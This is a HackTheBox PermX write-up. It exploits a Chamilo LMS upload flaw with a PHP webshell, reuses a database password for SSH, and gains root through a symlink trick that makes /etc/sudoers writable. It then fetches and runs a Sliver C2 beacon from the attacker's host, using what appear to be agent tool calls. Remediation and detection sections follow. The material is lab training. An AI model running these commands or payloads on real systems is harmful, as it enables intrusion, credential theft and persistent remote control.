---
layout: default
title: "HackTheBox - PermX"
---

# HackTheBox - PermX

**OS:** Ubuntu 22.04.4 LTS

PermX is a Linux machine built around Chamilo LMS 1.11.10, an open-source e-learning
platform exposed on a subdomain. An unauthenticated file upload endpoint (CVE-2023-4220)
accepts arbitrary PHP, placing a webshell with no authentication required. Reading the
Chamilo database configuration file reveals a plaintext password that the local user `mtz`
reused for SSH. Privilege escalation leverages a sudo-granted shell script that calls
`setfacl` without resolving symlinks, so a symlink to `/etc/sudoers` passes the path check
and receives a write ACL, enabling a direct sudoers append to gain unrestricted root.

| Field | Value |
|---|---|
| Platform | HTB |
| Target | `<target-ip>` (permx.htb) |
| Initial Access | CVE-2023-4220 Chamilo 1.11.10 unauthenticated file upload RCE |
| Privilege Escalation | sudo acl.sh symlink bypass, setfacl on /etc/sudoers, sudoers append |
| Final Access | `root` |

---

## Recon

### Port Scan

p0rtix ran a full TCP scan against the target. Two services were open: SSH on 22 and
HTTP on 80. The web server redirected all requests to `permx.htb`, confirming a
name-based virtual hosting setup.

| Port | Proto | Service | Notes |
|---|---|---|---|
| 22 | TCP | SSH | OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 |
| 80 | TCP | HTTP | Apache 2.4.52, redirects to `permx.htb` |

### Virtual Host Discovery

With only two ports open, the HTTP surface was the primary attack vector. After adding
`permx.htb` to `/etc/hosts`, the default vhost returned the Chamilo LMS landing page,
suggesting additional subdomains might expose administrative or application surfaces. A
vhost fuzz with ffuf confirmed one additional subdomain, `lms.permx.htb`, which hosted
the full Chamilo LMS application:

```
v0idravl@kali:~/htb/permx$ ffuf -u http://10.129.28.107/ -H "Host: FUZZ.permx.htb" \
  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fc 302 -fs 0 -t 40
[Status: 200, Size: 36182] www
[Status: 200, Size: 19347] lms
```

> **Why this works:** Apache name-based virtual hosts serve different content depending
> on the `Host:` header value. Fuzzing the `Host:` header against a wordlist of common
> subdomain names iterates over candidates while the target IP stays constant. The `-fc
> 302` flag filters the redirect that the default vhost returns for unknown names,
> leaving only legitimate hits.

### Chamilo Version Fingerprint

Browsing to `http://lms.permx.htb` presented the Chamilo LMS login page. The version
was confirmed as **1.11.10** via the footer and the `/documentation/changelog.html`
page, both of which ship with the default Chamilo install and are readable
unauthenticated. This version is within the affected range for CVE-2023-4220, an
unauthenticated arbitrary file upload.

---

## Initial Access

### CVE-2023-4220: Unauthenticated File Upload (Chamilo 1.11.10)

Chamilo 1.11.10 ships a large-file upload helper at
`/main/inc/lib/javascript/bigupload/inc/bigUpload.php`. When called with
`?action=post-unsupported`, the endpoint accepts a multipart file upload and stores the
file directly under
`/main/inc/lib/javascript/bigupload/files/<filename>` with no authentication check and
no file type validation. Because the target directory is web-accessible and the Apache
instance serves `.php` files through the PHP interpreter, any uploaded `.php` file
becomes executable.

> **Why this works:** The endpoint was designed to handle chunked uploads of
> unsupported file types before they are processed by downstream converters, and the
> authentication gate was simply absent from this code path. The upload directory sits
> under the web root and inherits the default Apache handler configuration, so PHP
> is interpreted there exactly as it is anywhere else under the vhost.

A minimal PHP webshell (`<?php system($_GET['c']); ?>`) was saved locally as
`shell.php` and uploaded:

```
v0idravl@kali:~/htb/permx$ curl -s \
  "http://lms.permx.htb/main/inc/lib/javascript/bigupload/inc/bigUpload.php?action=post-unsupported" \
  -F "bigUploadFile=@shell.php;type=application/x-php"
The file has successfully been uploaded.

v0idravl@kali:~/htb/permx$ curl -s "http://lms.permx.htb/main/inc/lib/javascript/bigupload/files/shell.php?c=id"
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Remote code execution confirmed as `www-data`.

---

## Post-Access Enumeration

### Chamilo Database Credentials

The Chamilo configuration file at `/var/www/chamilo/app/config/configuration.php`
stores database connection parameters in plaintext as PHP array assignments. Reading it
through the webshell returned the database password:

```
v0idravl@kali:~/htb/permx$ curl -s "http://lms.permx.htb/main/inc/lib/javascript/bigupload/files/shell.php" \
  --data-urlencode "c=grep -E 'db_pass|db_user|db_host|main_database' /var/www/chamilo/app/config/configuration.php"
$_configuration['db_host'] = 'localhost';
$_configuration['main_database'] = 'chamilo';
$_configuration['db_user'] = 'chamilo';
$_configuration['db_password'] = '03F6lY3uXAP2bkW8';
```

> **Why this works:** Web applications that store database credentials in flat PHP
> config files expose those credentials to any process that can read the file, including
> a webshell running as the web server user. Chamilo ships with this file inside the web
> root, so `www-data` has read access by design.

### Local User Discovery

Reading `/etc/passwd` through the webshell identified one interactive local user:
`mtz` (UID 1000). Credential reuse between application database passwords and OS
account passwords is a common misconfiguration in lab and production environments alike.
The Chamilo DB password was tested against `mtz` via SSH.

---

## Privilege Escalation

### SSH Access as `mtz` (Credential Reuse)

The database password `03F6lY3uXAP2bkW8` authenticated directly over SSH as `mtz`:

```
v0idravl@kali:~/htb/permx$ ssh mtz@<target-ip>
mtz@<target-ip>'s password: 03F6lY3uXAP2bkW8
mtz@permx:~$ id
uid=1000(mtz) gid=1000(mtz) groups=1000(mtz)
mtz@permx:~$ cat ~/user.txt
<user-flag-redacted>
```

> **Why this works:** Application service accounts and OS users on the same host are
> often managed by the same person, and a memorable password set once tends to propagate
> across both. The database password was the plaintext value already configured in the
> app, so testing it for the local OS user costs nothing.

### sudo -l Enumeration

`sudo -l` immediately surfaced an interesting rule:

```
mtz@permx:~$ sudo -l
(ALL : ALL) NOPASSWD: /opt/acl.sh
```

`mtz` can run `/opt/acl.sh` as root with no password. The script contents:

```bash
#!/bin/bash
if [ "$#" -ne 3 ]; then
  /usr/bin/echo "Usage: $0 user perm file"
  exit 1
fi
user="$1"
perm="$2"
target="$3"
if [[ "$target" != /home/mtz/* || "$target" == *..* ]]; then
  /usr/bin/echo "Access denied."
  exit 1
fi
if [ ! -f "$target" ]; then
  /usr/bin/echo "Target must be a file."
  exit 1
fi
/usr/bin/sudo /usr/bin/setfacl -m u:"$user":"$perm" "$target"
```

The script calls `setfacl` to grant a POSIX ACL on a file, but only after two guards:

1. The target path must start with `/home/mtz/`
2. The target path must not contain `..`

> **Why the guards are insufficient:** Both checks operate on the path string, not on
> the resolved inode. A symbolic link satisfies both conditions: its path starts with
> `/home/mtz/` and contains no `..` component, yet `setfacl` follows the link and
> applies the ACL to the link destination. The `[ ! -f "$target" ]` test also follows
> symlinks, confirming the link appears as a regular file. The net effect is that the
> path-restriction logic is bypassed entirely by one `ln -sf` call.

### Symlink Attack to Write `/etc/sudoers`

A symlink pointing from a path inside `/home/mtz/` to `/etc/sudoers` satisfies every
guard in the script:

```
mtz@permx:~$ ln -sf /etc/sudoers /home/mtz/sudoers_lnk
mtz@permx:~$ sudo /opt/acl.sh mtz rw /home/mtz/sudoers_lnk
```

`setfacl` followed the symlink and granted `mtz` read-write access on `/etc/sudoers`
itself. A single line was appended to give `mtz` unrestricted passwordless sudo:

```
mtz@permx:~$ echo "mtz ALL=(ALL) NOPASSWD: ALL" >> /home/mtz/sudoers_lnk
mtz@permx:~$ sudo id
uid=0(root) gid=0(root) groups=0(root)
mtz@permx:~$ sudo cat /root/root.txt
<root-flag-redacted>
```

Root achieved.

---

## Post-Access: C2 (Sliver)

A Sliver HTTP beacon was generated and deployed through the existing SSH session to
model operator tradecraft and establish a resilient C2 channel as `mtz`.

### Beacon Generation

**sliver-mcp** `regenerate_or_build(c2_host="10.10.16.21", c2_port=8080, os="linux", arch="amd64", protocol="http", is_beacon=True, interval=30, jitter=10)`

**Sliver console** `generate beacon --http 10.10.16.21:8080 --os linux --arch amd64 --seconds 30 --jitter 10`

```
[*] evicted stale pool build and compiled fresh
[*] Implant saved to /home/v0idravl/sliver-payloads/pool-http-linuxamd64
```

### Beacon Deployment

The beacon was staged on the attacker's HTTP server and pulled down over SSH:

```
mtz@permx:~$ curl -so /tmp/.beacon http://10.10.16.21:9002/beacon && chmod +x /tmp/.beacon
mtz@permx:~$ nohup /tmp/.beacon > /dev/null 2>&1 &
[1] 1937
```

### Beacon Check-In Confirmation

**sliver-mcp** `list_beacons()`

**Sliver console** `beacons`

```
 ID         Name                    Transport   Hostname   Username   PID    Last Check-In
========== ======================= =========== ========== ========== ====== ==============
 c488d4d0   pool-http-linuxamd64    http        permx      mtz        1937   30s ago
```

### Execution Verification

**sliver-mcp** `execute(target_id="c488d4d0-432f-441e-8119-a32ff1660c1a", path="/bin/bash", args=["-c","id && hostname && uname -a"])`

**Sliver console** `use c488d4d0` then `execute -e /bin/bash -c 'id && hostname && uname -a'`

```
uid=1000(mtz) gid=1000(mtz) groups=1000(mtz)
permx
Linux permx 5.15.0-113-generic #123-Ubuntu SMP Mon Jun 10 08:16:17 UTC 2024 x86_64 x86_64 x86_64 GNU/Linux
```

The beacon confirms a stable HTTP C2 channel from `permx` to the operator. From this
position an adversary would escalate to root using the sudoers write demonstrated above,
then establish persistence, harvest SSH keys, or pivot to other reachable hosts.

---

## Root Cause

PermX falls to a short chain of two independent vulnerabilities and one configuration
failure:

1. **Unauthenticated file upload (CVE-2023-4220).** The Chamilo large-file upload helper
   applied no authentication and no file type validation, allowing any HTTP client to
   place a PHP file in a web-accessible directory.
2. **Plaintext application credential reused as an OS credential.** The Chamilo database
   password was identical to the local user `mtz`'s SSH password. A credential stored in
   a web-accessible PHP file should never also grant OS access.
3. **Symlink-blind path check in a setuid-equivalent script.** The `acl.sh` script
   restricted file paths by string matching only, without resolving symlinks, allowing
   `setfacl` to receive root-delegated write access to arbitrary files outside
   `/home/mtz/`.

---

## Impact

An unauthenticated attacker with network access to port 80 can achieve full root
compromise in three steps: upload a webshell, read the database config for the SSH
credential, and exploit the symlink bypass to write sudoers. No credentials, prior
knowledge, or brute force are required for the initial access step. On a production
system this path would expose all data stored in the LMS database, all files accessible
to root, and a persistent foothold for further lateral movement.

---

## Remediation

**1. Patch Chamilo to a version that fixes CVE-2023-4220 (highest priority).**
Upgrade to Chamilo 1.11.24 or later, which removes the unauthenticated upload path.
If an immediate upgrade is not possible, restrict access to
`/main/inc/lib/javascript/bigupload/` via web server configuration (require
authentication or block the path entirely via `Require all denied` in Apache).

**2. Enforce unique credentials across the application and OS layers.**
The database service account password must never be the same as any OS user's password.
Store application secrets in a dedicated secret management solution or at minimum ensure
that the OS account password is set and rotated independently of any application
credential stored in a config file under the web root.

**3. Fix the symlink check in `/opt/acl.sh`.**
Replace the string-based path check with `realpath` resolution before comparison:

```bash
resolved=$(realpath "$target" 2>/dev/null)
if [[ "$resolved" != /home/mtz/* ]]; then
  /usr/bin/echo "Access denied."
  exit 1
fi
```

`realpath` follows all symlinks and returns the canonical path, so a link to
`/etc/sudoers` returns `/etc/sudoers` and fails the prefix check. Alternatively,
remove the sudo rule entirely if ACL management for `mtz` files is not a genuine
operational requirement.

**4. Audit the sudoers configuration.**
After remediation, review all NOPASSWD sudo rules. Rules that invoke third-party
programs, shell scripts, or any utility that follows symlinks or accepts caller-supplied
paths should be treated as high-risk and minimized.

### Validation

- Confirm that a POST to the bigupload endpoint with a `.php` file returns a permission
  denied or 403 response rather than a success message.
- Confirm that SSH login with the Chamilo DB password as `mtz` fails after credential
  rotation.
- Confirm that `sudo /opt/acl.sh mtz rw /home/mtz/sudoers_lnk` (where `sudoers_lnk`
  is a symlink to `/etc/sudoers`) returns "Access denied."

---

## Detection Opportunities

- **Unauthenticated POST to bigupload endpoint:** any POST to
  `/main/inc/lib/javascript/bigupload/inc/bigUpload.php` from an unauthenticated client
  (no session cookie) should alert. The payload content type `application/x-php` or any
  upload of a `.php` file to this path is an unambiguous indicator.
- **Webshell execution:** process ancestry showing Apache spawning `sh`/`bash`/`curl`
  with non-interactive TTY, or `www-data` reading files outside the web root (e.g.
  `/etc/passwd`, `/var/www/chamilo/app/config/`), is a strong indicator of webshell
  activity.
- **SSH login from unexpected source:** `mtz` authenticating via SSH from an IP that
  has also been seen issuing HTTP requests to the LMS should be correlated as suspicious
  lateral movement.
- **setfacl called by root on sensitive files:** `setfacl` modifying ACLs on
  `/etc/sudoers` or any file outside `/home/` when invoked from the `acl.sh` script
  would be a high-confidence alert. Auditd rules on `/etc/sudoers` writes provide this
  signal.
- **Sudoers modification:** `inotifywait` or auditd on writes to `/etc/sudoers` or any
  file in `/etc/sudoers.d/` is a near-zero false-positive detection for this class of
  attack.

---

## Lessons Learned

- **Vhost fuzzing is mandatory on single-service HTTP targets.** The root vhost gave
  nothing; the `lms` subdomain held the entire attack surface. Skipping vhost discovery
  here would have meant missing the initial access vector entirely.
- **Version fingerprint before assuming no CVE.** Chamilo 1.11.10 has a critical public
  CVE with a working one-liner exploit. Confirming the exact version early collapsed the
  time-to-foothold to minutes.
- **Read config files, not just databases.** The credential was in a PHP config file
  readable via the webshell, not behind a database query. File-read primitives from a
  webshell are often faster and cleaner than interactive DB sessions.
- **Sudo scripts that call file-system tools need symlink hardening.** Any script that
  accepts a path argument and passes it to a privileged tool (`setfacl`, `chmod`, `cp`,
  `chown`) must resolve symlinks before applying any path restriction. String matching
  on the caller-supplied path is always bypassable.

---

## Cleanup

- Webshell `shell.php` written to `/var/www/chamilo/main/inc/lib/javascript/bigupload/files/`
  on the target. Removal command: `rm /var/www/chamilo/main/inc/lib/javascript/bigupload/files/shell.php`
  (run via the webshell or SSH before it is removed).
- `/tmp/.beacon` killed and removed from the target; the process (PID 1937) was
  terminated and the binary deleted.
- `/home/mtz/sudoers_lnk` symlink removed with `rm /home/mtz/sudoers_lnk`.
- The `mtz ALL=(ALL) NOPASSWD: ALL` line appended to `/etc/sudoers` is not reverted
  manually; HTB machine reset restores the original `/etc/sudoers` state.
- Sliver beacon `c488d4d0` killed via sliver-mcp (`kill_beacon`); the HTTP listener
  on port 8080 (job retained for subsequent boxes) was left running.
- No other files were written to disk on the target outside of `/tmp/.beacon` and the
  webshell.
